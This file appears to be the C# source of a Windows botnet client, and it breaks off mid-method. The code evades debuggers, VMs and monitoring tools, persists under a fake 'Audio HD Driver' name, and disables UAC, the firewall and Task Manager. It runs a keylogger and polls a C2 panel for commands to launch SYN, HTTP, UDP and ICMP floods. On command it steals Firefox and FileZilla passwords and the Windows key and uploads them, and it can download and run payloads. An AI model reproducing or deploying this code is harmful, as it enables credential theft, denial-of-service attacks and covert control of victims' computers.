namespace Stub
{
    using Microsoft.Win32;
    using System;
    using System.Collections;
    using System.Data;
    using System.Diagnostics;
    using System.IO;
    using System.Management;
    using System.Net;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Globalization;
    using System.Security.Cryptography;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Threading;
    using System.Windows.Forms;
    using System.Xml;

    public static class CryptoHelper
    {
        public static string DecryptAes(byte[] encryptedData)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes("");
                aes.IV = Encoding.UTF8.GetBytes("");
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    byte[] decrypted = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                    return Encoding.UTF8.GetString(decrypted);
                }
            }
        }
    }



    internal class Stub
    {
 
        // 🔐 Anti-Analysis Flags
        private static bool AntiDebugger = false;
        private static bool AntiEmulator = false;
        private static bool AntiSandboxie = false;

        private static bool AntiVirtualBox = false;
        private static bool AntiVMWare = false;
        private static bool AntiVirtualPC = false;
        private static bool AntiParallelsDesktop = false;

        private static bool AntiCainandAbel = false;
        private static bool AntiWireshark = false;
        private static bool AntiFilemon = false;
        private static bool AntiNetstat = false;
        private static bool AntiNetworkmon = false;
        private static bool AntiProcessmon = false;
        private static bool AntiRegmon = false;
        private static bool AntiTCPView = false;

        // ⚙️ Behavior & Persistence
        private static bool DisableCMD = false;
        private static bool DisableFirewall = false;
        private static bool DisableRegistry = false;
        private static bool DisableTaskmanager = false;
        private static bool DisableUAC = false;

        private static bool MeltServer = false;
        private static bool DelayStart = false;
        private static string DelayTime = "Delay";
        private static string AutostartName = "AudioHDLoader.exe";

        // 🌐 Bot Info & C2
        private static string BotServer = "http:///Webpanel/connect.php";
        private static readonly byte[] Key = Encoding.UTF8.GetBytes(""); // 16 bytes (AES-128)
        private static readonly byte[] IV = Encoding.UTF8.GetBytes(""); // 16 bytes (AES block size)
        private static string BotVersion = "2.0.8";
        private static string ConnectionInterval = "10";
        private static string Country = CultureInfo.CurrentUICulture.Name.Substring(3);
        private static string PcName = Environment.MachineName;
        private static string HWID = GetMD5Hash(getUniqueID());
        private static string WinVersion = GetWinVersion() + GetBitVersion();

        // 💬 Fake Error (optional)
        private static bool FakeError = false;
        private static string FakeErrorTitle = "explorer.exe";
        private static string FakeErrorMessage = "Restart Computer for Actions to take effect";

        // 🧠 Miscellaneous / Runtime 
        private static string OldCommand = string.Empty;
        private static string StealerLog = string.Empty;
        private static IntPtr NSS3;
        private static RandomStringGenerator Rand = new RandomStringGenerator();
        public static string signon;

        // Webhook and paths - static fields
        private static readonly string webhookUrl = "http:///Webpanel/keylog.php";
        private static readonly string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static readonly string folderPath = Path.Combine(appData, "MyAppLogs");
        private static readonly string filePath = Path.Combine(folderPath, "rawinput.o7lab");

        public static void UploadLog()
        {
            if (File.Exists(filePath))
            {
                WebhookSender.SendFile(webhookUrl, filePath);
            }
        }

        // Static constructor to initialize dependent static fields
        static Stub() // Replace 'Stub' with your actual class name
        {
            appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            folderPath = System.IO.Path.Combine(appData, "MyAppLogs");
            filePath = System.IO.Path.Combine(folderPath, "rawinput.o7lab");
        }

        static void Main(string[] args)
        {
            // Initialization code here
            Keylogger.keylog();  // <-- call it here to start logging keys
                                 // Other code or keep the process running
            Application.Run();  // Or some loop to keep app alive
        }

        private static string HttpPost(string url, string parameters)
        {
            try
            {
                ServicePointManager.Expect100Continue = false;
                byte[] data = Encoding.ASCII.GetBytes(parameters);
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;
                using (Stream requestStream = request.GetRequestStream())
                {
                    requestStream.Write(data, 0, data.Length);
                }
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    return reader.ReadToEnd().Trim();
                }
            }
            catch (Exception ex)
            {
                // Optional: Log or handle error
                return null;
            }
        }

        public static bool CheckProcessIsRun(string sProcessName)
        {
            return (Process.GetProcessesByName(sProcessName).Length > 0);
        }

        public static string GetBitVersion()
        {
            string str = "";
            if (Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"))
            {
                return " (32 Bit)";
            }
            return (str + " (64 Bit)");
        }

        public static string getCPUID()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_Processor WHERE DeviceID = 'CPU0'");
            string str = "";
            foreach (ManagementObject obj2 in searcher.Get())
            {
                str = Convert.ToString(obj2["ProcessorId"]);
            }
            return str;
        }

        public static string getGraphicDevice()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController");
            string str = "";
            foreach (ManagementObject obj2 in searcher.Get())
            {
                str = Convert.ToString(obj2["Description"]);
            }
            return str;
        }

        public static string GetGraphicDevice()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        var desc = mo["Description"]?.ToString();
                        if (!string.IsNullOrEmpty(desc))
                            return desc;
                    }
                }
            }
            catch
            {
                // Return unknown on failure
            }

            return "Unknown";
        }

        public static string GetMD5Hash(string input)
        {
            if (string.IsNullOrEmpty(input))
                return string.Empty;

            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                StringBuilder sb = new StringBuilder();
                foreach (byte b in hashBytes)
                    sb.Append(b.ToString("x2"));

                return sb.ToString();
            }
        }



        public static string GetMotherboardSerial()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT SerialNumber FROM Win32_BaseBoard"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        var serial = mo["SerialNumber"]?.ToString();
                        if (!string.IsNullOrEmpty(serial))
                            return serial;
                    }
                }
            }
            catch
            {
                // Suppress error for stealth or fallback
            }

            return "Unknown";
        }

        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        public static string getUniqueID()
        {
            string cpu = getCPUID();
            string gpu = getGraphicDevice();
            string mobo = GetMotherboardSerial();

            // Fallbacks
            if (string.IsNullOrWhiteSpace(cpu)) cpu = "CPU-NULL";
            if (string.IsNullOrWhiteSpace(gpu)) gpu = "GPU-NULL";
            if (string.IsNullOrWhiteSpace(mobo)) mobo = "MOBO-NULL";

            string combined = (cpu + gpu + mobo).Trim().Replace(" ", "").ToUpperInvariant();
            return GetMD5Hash(combined);
        }

        public static string GetWinVersion()
        {
            try
            {
                Version ver = Environment.OSVersion.Version;

                if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                {
                    if (ver.Major == 5)
                    {
                        if (ver.Minor == 0) return "Windows 2000";
                        if (ver.Minor == 1) return "Windows XP";
                        if (ver.Minor == 2) return "Windows Server 2003";
                    }
                    if (ver.Major == 6)
                    {
                        if (ver.Minor == 0) return "Windows Vista";
                        if (ver.Minor == 1) return "Windows 7";
                        if (ver.Minor == 2) return "Windows 8";
                        if (ver.Minor == 3) return "Windows 8.1";
                    }
                    if (ver.Major == 10)
                    {
                        // Windows 10 or 11 depending on build number
                        if (ver.Build >= 22000)
                            return "Windows 11";
                        else
                            return "Windows 10";
                    }
                }

                if (Environment.OSVersion.Platform == PlatformID.Win32Windows)
                {
                    if (ver.Minor == 10) return "Windows 98";
                    if (ver.Minor == 90) return "Windows Me";
                }
            }
            catch
            {
                // fail silently
            }

            return "Unknown Windows Version";
        }




        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllFilePath);
        private static void AntiMain(string[] args)
        {
            bool createdNew = false;
            new Mutex(true, "qDQkpzPbz9u", out createdNew);
            if (createdNew)
            {
                if (FakeError)
                {
                    try
                    {
                        new Thread(new ThreadStart(Stub.tFakeError)).Start();
                    }
                    catch
                    {
                    }
                }
                if (AntiDebugger)
                {
                    try
                    {
                        if (Debugger.IsAttached)
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiEmulator)
                {
                    try
                    {
                        long ticks = 0L;
                        ticks = DateTime.Now.Ticks;
                        Thread.Sleep(10);
                        if ((DateTime.Now.Ticks - ticks) < 10L)
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiNetstat)
                {
                    try
                    {
                        if (CheckProcessIsRun("NETSTAT"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiSandboxie)
                {
                    try
                    {
                        Form form = new Form();
                        form.Text = "TEST";
                        form.Opacity = 0.0;
                        form.ShowInTaskbar = false;
                        form.Show();
                        if (form.Text == "[#] TEST [#]")
                        {
                            return;
                        }
                        form.Close();
                    }
                    catch
                    {
                    }
                }
                if (AntiFilemon)
                {
                    try
                    {
                        if (CheckProcessIsRun("FILEMON"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiProcessmon)
                {
                    try
                    {
                        if (CheckProcessIsRun("PROCMON"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiRegmon)
                {
                    try
                    {
                        if (CheckProcessIsRun("REGMON"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiCainandAbel)
                {
                    try
                    {
                        if (CheckProcessIsRun("CAIN"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiNetworkmon)
                {
                    try
                    {
                        if (CheckProcessIsRun("NETMON"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiTCPView)
                {
                    try
                    {
                        if (CheckProcessIsRun("TCPVIEW"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiWireshark)
                {
                    try
                    {
                        if (CheckProcessIsRun("WIRESHARK"))
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiParallelsDesktop)
                {
                    try
                    {
                        if (GetGraphicDevice() == "Parallels Video Adapter")
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiVMWare)
                {
                    try
                    {
                        if (GetGraphicDevice() == "VMware SVGA II")
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiVirtualBox)
                {
                    try
                    {
                        if (GetGraphicDevice() == "VirtualBox Graphics Adapter")
                        {
                            return;
                        }
                    }
                    catch
                    {
                    }
                }
                if (AntiVirtualPC)
                {
                    try
                    {
                        string[] strArray = new string[] { "VM Additions S3 Trio32/64", "S3 Trio32/64" };
                        for (int i = 0; i < strArray.Length; i++)
                        {
                            if (GetGraphicDevice() == strArray[i])
                            {
                                return;
                            }
                        }
                    }
                    catch
                    {
                    }
                }
                if (DelayStart)
                {
                    try
                    {
                        Thread.Sleep((int) (Convert.ToInt32(DelayTime) * 0x3e8));
                    }
                    catch
                    {
                    }
                }
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("Hidden", "2", RegistryValueKind.DWord);
                }
                catch
                {
                }
                try
                {
                    FileStream stream = new FileStream(Process.GetCurrentProcess().MainModule.FileName, FileMode.Open, FileAccess.Read);
                    byte[] buffer = new byte[stream.Length];
                    stream.Read(buffer, 0, buffer.Length);
                    stream.Close();
                    FileStream stream2 = new FileStream(Environment.GetEnvironmentVariable("TEMP") + @"\" + AutostartName, FileMode.Create);
                    stream2.Write(buffer, 0, buffer.Length);
                    stream2.Close();
                    stream2.Dispose();
                    System.IO.File.SetAttributes(Environment.GetEnvironmentVariable("TEMP") + @"\" + AutostartName, FileAttributes.Hidden);
                }
                catch
                {
                }
                try
                {
                    if (DisableUAC)
                    {
                        Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + @"\" + AutostartName);
                    }
                    else
                    {
                        Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Audio HD Driver", Environment.GetEnvironmentVariable("TEMP") + @"\" + AutostartName);
                    }
                }
                catch
                {
                }
                if (DisableUAC)
                {
                    try
                    {
                        Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
                    }
                    catch
                    {
                    }
                    try
                    {
                        Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                        Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                    }
                    catch
                    {
                    }
                    if (DisableCMD)
                    {
                        if (Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System") == null)
                        {
                            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
                            Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true).SetValue("DisableCMD", "2", RegistryValueKind.DWord);
                        }
                        else
                        {
                            Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true).SetValue("DisableCMD", "2", RegistryValueKind.DWord);
                        }
                    }
                    if (DisableFirewall)
                    {
                        try
                        {
                            Process process = new Process();
                            process.StartInfo.FileName = "Netsh";
                            process.StartInfo.Arguments = "Advfirewall set Currentprofile State off";
                            process.StartInfo.UseShellExecute = false;
                            process.StartInfo.CreateNoWindow = true;
                            process.Start();
                        }
                        catch
                        {
                        }
                    }
                    if (DisableRegistry)
                    {
                        try
                        {
                            if (Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System") == null)
                            {
                                RegistryKey key2 = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                            }
                            else
                            {
                                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                            }
                        }
                        catch
                        {
                        }
                    }
                    if (DisableTaskmanager)
                    {
                        try
                        {
                            if (Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System") == null)
                            {
                                RegistryKey key3 = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                            }
                            else
                            {
                                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                if (MeltServer)
                {
                    try
                    {
                        if (!Application.ExecutablePath.Contains(Environment.GetEnvironmentVariable("TEMP")))
                        {
                            string str6 = string.Concat(new object[] { ":Repeat\ndel ", '"', Environment.GetCommandLineArgs()[0], '"', "\nif exist ", '"', Path.GetFileName(Application.ExecutablePath), '"', " goto Repeat" });
                            TextWriter writer = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + @"\delete.bat");
                            writer.WriteLine(str6);
                            writer.Close();
                            Process process2 = new Process();
                            process2.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\delete.bat";
                            process2.StartInfo.UseShellExecute = false;
                            process2.StartInfo.CreateNoWindow = true;
                            process2.Start();
                            Process process3 = new Process();
                            process3.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\" + AutostartName;
                            process3.Start();
                        }
                    }
                    catch
                    {
                    }
                    Environment.Exit(0);
                }
                while (true)
                {
                    try
                    {
                        string parameters = "pcname=" + PcName + "&botver=" + BotVersion + "&country=" + Country + "&winver=" + WinVersion + "&hwid=" + HWID;
                        string command = HttpPost(BotServer, parameters);

                        if (command.Length != 0)
                        {
                            if (command != OldCommand)
                            {
                                ParseCommand(command);
                                OldCommand = command;
                            }
                        }
                        else
                        {
                            try
                            {
                                SynFlood.StopSynFlood();
                            }
                            catch
                            {
                            }
                            try
                            {
                                HttpFlood.StopHttpFlood();
                            }
                            catch
                            {
                            }
                            try
                            {
                                UdpFlood.StopUdpFlood();
                            }
                            catch
                            {
                            }
                            try
                            {
                                IcmpFlood.StopIcmpFlood();
                            }
                            catch
                            {
                            }
                            OldCommand = string.Empty;
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep((int) (Convert.ToInt32(ConnectionInterval) * 0xea60));
                }
            }
        }

        public static long NSS_Init(string configdir)
        {
            string str = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Mozilla Firefox\";
            LoadLibrary(str + "mozcrt19.dll");
            LoadLibrary(str + "nspr4.dll");
            LoadLibrary(str + "plc4.dll");
            LoadLibrary(str + "plds4.dll");
            LoadLibrary(str + "ssutil3.dll");
            LoadLibrary(str + "sqlite3.dll");
            LoadLibrary(str + "nssutil3.dll");
            LoadLibrary(str + "softokn3.dll");
            NSS3 = LoadLibrary(str + "nss3.dll");
            DLLFunctionDelegate delegateForFunctionPointer = (DLLFunctionDelegate) Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "NSS_Init"), typeof(DLLFunctionDelegate));
            return delegateForFunctionPointer(configdir);
        }

        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            DLLFunctionDelegate4 delegateForFunctionPointer = (DLLFunctionDelegate4) Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "NSSBase64_DecodeBuffer"), typeof(DLLFunctionDelegate4));
            return delegateForFunctionPointer(arenaOpt, outItemOpt, inStr, inLen);
        }

        private static void ParseCommand(string Command)
        {
            try
            {
                string[] strArray = Command.Split(new char[] { '*' });
                if (Command.StartsWith("synflood"))
                {
                    try
                    {
                        SynFlood.Host = strArray[1];
                        SynFlood.Port = Convert.ToInt32(strArray[2]);
                        SynFlood.Threads = Convert.ToInt32(strArray[3]);
                        SynFlood.SynSockets = Convert.ToInt32(strArray[4]);
                        SynFlood.StartSynFlood();
                    }
                    catch
                    {
                    }
                }
                if (Command.StartsWith("httpflood"))
                {
                    try
                    {
                        HttpFlood.Host = strArray[1];
                        HttpFlood.Threads = Convert.ToInt32(strArray[2]);
                        HttpFlood.StartHttpFlood();
                    }
                    catch
                    {
                    }
                }
                if (Command.StartsWith("udpflood"))
                {
                    try
                    {
                        UdpFlood.Host = strArray[1];
                        UdpFlood.Port = Convert.ToInt32(strArray[2]);
                        UdpFlood.Threads = Convert.ToInt32(strArray[3]);
                        UdpFlood.UdpSockets = Convert.ToInt32(strArray[4]);
                        UdpFlood.PacketSize = Convert.ToInt32(strArray[5]); // ✅ updated from pSize
                        UdpFlood.StartUdpFlood();
                    }
                    catch
                    {
                        // optionally log error
                    }
                }

                if (Command.StartsWith("icmpflood"))
                {
                    try
                    {
                        IcmpFlood.Host = strArray[1];
                        IcmpFlood.Port = Convert.ToInt32(strArray[2]);
                        IcmpFlood.Threads = Convert.ToInt32(strArray[3]);
                        IcmpFlood.IcmpSockets = Convert.ToInt32(strArray[4]);
                        IcmpFlood.PacketSize = Convert.ToInt32(strArray[5]); // ✅ Correct for new class version
                        IcmpFlood.StartIcmpFlood();
                    }
                    catch
                    {
                        // You might want to log or report the error
                    }
                }

                if (Command.StartsWith("steal"))
                {
                    try
                    {
                        string stealerLog;
                        string str = string.Empty;
                        string text1 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Mozilla Firefox\";
                        string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles");
                        try
                        {
                            foreach (string str3 in directories)
                            {
                                foreach (string str4 in Directory.GetFiles(str3))
                                {
                                    if (Regex.IsMatch(str4, "signons.sqlite"))
                                    {
                                        NSS_Init(str3);
                                        signon = str4;
                                    }
                                }
                            }
                            DataTable table = new SQLiteBase(signon).ExecuteQuery("SELECT * FROM moz_logins;");
                            TSECItem result = new TSECItem();
                            TSECItem item2 = new TSECItem();
                            PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0L);
                            foreach (DataRow row in table.Rows)
                            {
                                byte[] buffer;
                                object obj2 = str;
                                str = string.Concat(new object[] { obj2, "Webseite: ", row["hostname"], "\n" });
                                StringBuilder inStr = new StringBuilder(row["encryptedUsername"].ToString());
                                TSECItem data = (TSECItem) Marshal.PtrToStructure(new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length)), typeof(TSECItem));
                                if ((PK11SDR_Decrypt(ref data, ref result, 0) == 0) && (result.SECItemLen != 0))
                                {
                                    buffer = new byte[result.SECItemLen];
                                    Marshal.Copy(new IntPtr(result.SECItemData), buffer, 0, result.SECItemLen);
                                    str = str + "Benutzername: " + Encoding.ASCII.GetString(buffer) + "\n";
                                }
                                StringBuilder builder2 = new StringBuilder(row["encryptedPassword"].ToString());
                                TSECItem item4 = (TSECItem) Marshal.PtrToStructure(new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, builder2, builder2.Length)), typeof(TSECItem));
                                if ((PK11SDR_Decrypt(ref item4, ref item2, 0) == 0) && (item2.SECItemLen != 0))
                                {
                                    buffer = new byte[item2.SECItemLen];
                                    Marshal.Copy(new IntPtr(item2.SECItemData), buffer, 0, item2.SECItemLen);
                                    str = str + "Passwort: " + Encoding.ASCII.GetString(buffer) + "\n";
                                }
                                str = str + "\n";
                            }
                        }
                        catch
                        {
                        }
                        if (str != string.Empty)
                        {
                            StealerLog = StealerLog + "********************************************\n************ Firefox Passwords *************\n********************************************\n\n" + str;
                        }
                        string str5 = string.Empty;
                        string str6 = string.Empty;
                        try
                        {
                            XmlDocument document = new XmlDocument();
                            document.Load(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\sitemanager.xml");
                            foreach (XmlNode node in document.DocumentElement.SelectNodes("Servers/Server"))
                            {
                                string str7 = node.SelectSingleNode("Host").FirstChild.Value;
                                string str8 = node.SelectSingleNode("User").FirstChild.Value;
                                string str9 = node.SelectSingleNode("Pass").FirstChild.Value;
                                string str10 = node.SelectSingleNode("Port").FirstChild.Value;
                                stealerLog = str5;
                                str5 = stealerLog + "Server: " + str7 + "\nBenutzername: " + str8 + "\nPasswort: " + str9 + "\nPort: " + str10 + "\n\n";
                            }
                        }
                        catch
                        {
                        }
                        try
                        {
                            XmlDocument document2 = new XmlDocument();
                            document2.Load(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\recentservers.xml");
                            foreach (XmlNode node2 in document2.DocumentElement.SelectNodes("RecentServers/Server"))
                            {
                                string str11 = node2.SelectSingleNode("Host").FirstChild.Value;
                                string str12 = node2.SelectSingleNode("User").FirstChild.Value;
                                string str13 = node2.SelectSingleNode("Pass").FirstChild.Value;
                                string str14 = node2.SelectSingleNode("Port").FirstChild.Value;
                                stealerLog = str6;
                                str6 = stealerLog + "Server: " + str11 + "\nBenutzername: " + str12 + "\nPasswort: " + str13 + "\nPort: " + str14 + "\n\n";
                            }
                        }
                        catch
                        {
                        }
                        if ((str5 != string.Empty) | (str6 != string.Empty))
                        {
                            StealerLog = StealerLog + "********************************************\n************ FileZilla Passwords ***********\n********************************************\n\n" + str5 + str6;
                        }
                        string str15 = string.Empty;
                        string str16 = string.Empty;
                        try
                        {
                            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\\Microsoft\\Windows NT\\CurrentVersion");
                            if (key != null)
                            {
                                str15 = (string) key.GetValue("ProductName");
                            }
                            RegistryKey key2 = Registry.LocalMachine.OpenSubKey(@"Software\\Microsoft\\Windows NT\\CurrentVersion");
                            if (key2 != null)
                            {
                                str16 = KeyDecoder.DecodeProductKey((byte[]) key2.GetValue("DigitalProductId", RegistryValueKind.DWord));
                            }
                        }
                        catch
                        {
                        }
                        if ((str15 != string.Empty) | (str16 != string.Empty))
                        {
                            stealerLog = StealerLog;
                            StealerLog = stealerLog + "********************************************\n************ Windows CD-Key ****************\n********************************************\n\n" + str15 + ": " + str16 + "\n";
                        }
                        try
                        {
                            StreamWriter writer = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + @"\" + Environment.MachineName + ".log");
                            writer.Write(StealerLog);
                            writer.Close();
                        }
                        catch
                        {
                        }
                        try
                        {
                            ServicePointManager.Expect100Continue = false;
                            new WebClient().UploadFile(strArray[1], "POST", Environment.GetEnvironmentVariable("TEMP") + @"\" + Environment.MachineName + ".log");
                        }
                        catch
                        {
                        }
                        try
                        {
                            System.IO.File.Delete(Environment.GetEnvironmentVariable("TEMP") + @"\" + Environment.MachineName + ".log");
                        }
                        catch
                        {
                        }
                    }
                    catch
                    {
                    }
                }
                if (Command.StartsWith("downandexe"))
                {
                    try
                    {
                        string str17 = Rand.NextString(12) + ".exe";
                        new WebClient().DownloadFile(strArray[1], Environment.GetEnvironmentVariable("TEMP") + @"\" + str17);
                        Process process = new Process();
                        process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\" + str17;
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        process.Start();
                    }
                    catch
                    {
                    }
                }
                if (Command.StartsWith("visit"))
                {
                    try
                    {
                        Process process2 = new Process();
                        process2.StartInfo = new ProcessStartInfo(strArray[1]);
                        process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        process2.Start();
                    }
                    catch
                    {
                    }
                }
                if (Command.StartsWith("update"))
                {
                    try
                    {
                        string str18 = Rand.NextString(12) + ".exe";
                        new WebClient().DownloadFile(strArray[1], Environment.GetEnvironmentVariable("TEMP") + @"\" + str18);
                        Process process3 = new Process();
                        process3.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\" + str18;
                        process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        process3.Start();
                    }
                    catch
                    {
                    }
                    try
                    {
                        string str19 = string.Concat(new object[] { ":Repeat\ndel ", '"', Environment.GetCommandLineArgs()[0], '"', "\nif exist ", '"', Path.GetFileName(Application.ExecutablePath), '"', " goto Repeat" });
                        TextWriter writer2 = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + @"\delete.bat");
                        writer2.WriteLine(str19);
                        writer2.Close();
                        Process process4 = new Process();
                        process4.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\delete.bat";
                        process4.StartInfo.UseShellExecute = false;
                        process4.StartInfo.CreateNoWindow = true;
                        process4.Start();
                    }
                    catch
                    {
                    }
                    Environment.Exit(0);
                }
                if ((Command.StartsWith("remove") & (strArray[1] == Environment.MachineName)) | (strArray[1] == "ALL"))
                {
                    try
                    {
                        if (DisableUAC)
                        {
                            Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Audio HD Driver");
                        }
                        else
                        {
                            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Audio HD Driver");
                        }
                    }
                    catch
                    {
                    }
                    try
                    {
                        string str20 = string.Concat(new object[] { ":Repeat\ndel ", '"', Environment.GetCommandLineArgs()[0], '"', "\nif exist ", '"', Path.GetFileName(Application.ExecutablePath), '"', " goto Repeat" });
                        TextWriter writer3 = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + @"\delete.bat");
                        writer3.WriteLine(str20);
                        writer3.Close();
                        Process process5 = new Process();
                        process5.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\delete.bat";
                        process5.StartInfo.UseShellExecute = false;
                        process5.StartInfo.CreateNoWindow = true;
                        process5.Start();
                    }
                    catch
                    {
                    }
                    Environment.Exit(0);
                }
            }
            catch
            {
            }
        }

        public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            DLLFunctionDelegate3 delegateForFunctionPointer = (DLLFunctionDelegate3) Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_Authenticate"), typeof(DLLFunctionDelegate3));
            return delegateForFunctionPointer(slot, loadCerts, wincx);
        }

        public static long PK11_GetInternalKeySlot()
        {
            DLLFunctionDelegate2 delegateForFunctionPointer = (DLLFunctionDelegate2) Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_GetInternalKeySlot"), typeof(DLLFunctionDelegate2));
            return delegateForFunctionPointer();
        }

        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            DLLFunctionDelegate5 delegateForFunctionPointer = (DLLFunctionDelegate5) Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11SDR_Decrypt"), typeof(DLLFunctionDelegate5));
            return delegateForFunctionPointer(ref data, ref result, cx);
        }

        public static void tFakeError()
        {
